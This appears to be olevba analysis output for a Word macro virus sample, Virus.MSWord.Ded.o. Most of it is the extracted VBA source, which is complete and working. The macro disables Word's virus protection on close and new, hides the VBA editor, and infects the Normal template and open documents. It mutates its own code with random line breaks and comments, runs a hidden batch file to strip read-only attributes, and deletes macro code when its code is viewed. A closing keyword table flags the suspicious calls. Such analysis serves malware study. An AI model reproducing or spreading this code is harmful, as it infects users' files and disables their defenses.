olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.o-e8cb54c08c18478064cc48b5c9a3ad03b7cc51a3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.o-e8cb54c08c18478064cc48b5c9a3ad03b7cc51a3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
     Private Sub Document_Close()
'61,32453
  On _
Error GoTo skam

Options.VirusProtection _
= False

   SWL
'7,746816
           ABS99
'97,70538
skam:
'33,96568
            End _
Sub

              Private Sub _
Идентификатор()

       End Sub
'86,49646
        Private Sub Document_New()
'99,2144
        End _
Sub

   ()
'66,85075
              On _
Error GoTo skam

    Options. _
     VirusProtection = False

 SWL
'7,37747
            ABS99
'19,83387
skam:
'32,99953
   End Sub
'57,16339
    Private Sub SWL()
'33,74245
        Application. _
                         ShowVisualBasicEditor = False

 If _
Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

            For I _
= 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

            d _
= NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

  If _
Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

          While _
Mid(d, Len(d) - 1, 2) = " _"

      I = _
I + 1

              d = _
Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

       Wend
'66,64411
        d _
= e(d)

 ActiveDocument. _
                          VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

   End If
'5,189943
         Next _
I

          ActiveDocument. _
                                           SaveAs AddToRecentFiles:=False

End If
'52,31261
             End _
Sub

            Private Sub ABS99()
'12,28269
             If Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, _
1000, 1000, False, False) Then

           f _
(NormalTemplate.FullName)

              For _
I = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

            d = ActiveDocument.VBProject. _
    VBComponents(1).CodeModule.Lines(I, 1)

 If Len(d) _
> 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

     While Mid(d, _
Len(d) - 1, 2) = " _"

      I _
= I + 1

         d _
= Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

          Wend
'31,19484
        d = e(d)
'63,67205
NormalTemplate. _
   VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

            End _
If

 Next I
'71,65875
        NormalTemplate. _
Save

           End _
If

            End Sub
'53,35845
             Private Function e(aString) As String
'67,83416
aString = LTrim(aString)
'38,42444
           aString = RTrim(aString)
'33,28069
 If _
aString = "Sub " & "Vc()" Then

           aString _
= "Sub " & "ViewVBCode()"

  Else
'23,64893
  If aString = "Sub " & "ViewVBCode()" Then
'19,7673
    aString _
= "Sub " & "Vc()"

       End If
'1,76965
            End If
'39,36817
         For _
I = 1 To Len(aString) - 1

  If Mid(aString, _
I, 1) = "." Then

       If _
Not Mid(aString, I - 1, 1) = Chr$(34) And Not Mid(aString, I + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

              If Not _
Mid(aString, I + 1, 1) = Chr$(34) Then

           e = Left(aString, I _
- 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - I)

         For _
j = 1 To Int(15 * Rnd)

             e = " " & e
'36,53447
Next j
'94,88163
         Exit _
Function

           End _
If

             End If
'14,64869
           Else
'1,532894
If _
Mid(aString, I, 1) = " " And Int(3 * Rnd) = 1 And I > 1 Then

        If Not Mid(aString, I _
+ 1, 1) = Chr$(34) And Not Mid(aString, I - 1, 1) = Chr$(34) Then

    e _
= Left(aString, I - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - I)

   For j = 1 _
To Int(15 * Rnd)

              e = " " & e
'70,12927
   Next j
'74,50183
Exit _
Function

End If
'7,350159
       End If
'21,52658
  End _
If

  Next _
I

         e = aString & Chr$(13) & "'" & (100 * _
Rnd)

         Count = Int(15 _
* Rnd)

     For j = 1 To _
Count

    e _
= " " & e

            Next j
'11,90435
         End Function
'41,34258
         Private Sub _
f(fName)

  If _
GetAttr(fName) And vbReadOnly Then

          Open Dir(fName) _
& ".bat" For Append As #1

            Print _
#1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)

      Print _
#1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

              Close _
#1

   shellResult = Shell(Dir(fName) & ".bat", vbHide)
'52,61716
   End _
If

        End _
Sub

  Sub _
ViewVBCode()

  For aDoc = 1 To _
Documents.Count

              For I = _
1 To Documents(aDoc).VBProject.VBComponents(1).CodeModule.CountOfLines

            Documents(aDoc). _
        VBProject.VBComponents(1).CodeModule.DeleteLines 1

           Next I
'41,28224
         Next aDoc
'95,20104
        For I = 1 _
To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

        NormalTemplate. _
    VBProject.VBComponents(1).CodeModule.DeleteLines 1

           Next I
'90,71612
   Application. _
    ShowVisualBasicEditor = True

End Sub
'70,91495
      Private Sub Document_Open()
'92,175
   End _
Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

